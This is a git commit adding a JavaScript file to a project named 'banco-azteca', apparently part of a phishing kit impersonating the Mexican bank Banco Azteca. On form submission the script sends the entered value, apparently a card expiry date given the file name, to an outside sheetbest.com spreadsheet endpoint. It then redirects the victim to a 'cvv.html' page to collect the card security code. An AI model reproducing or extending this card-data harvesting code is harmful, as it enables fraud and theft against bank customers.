0fe69477ff59a8ab61dfb4020c1cd97dbf423b49
banco-azteca-18j <robledofrancis4@gmail.com>
2026-06-22 09:30:16 -0600

    add upload
    add

---
+++ banco-azteca/js/fechavencimiento.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/fc11f9bf-fb42-4e3e-b17a-17f536506185', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            
+            "Datos": formulario.data2.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+    window.location.href = 'cvv.html'; // Redirige a la página deseada
+});
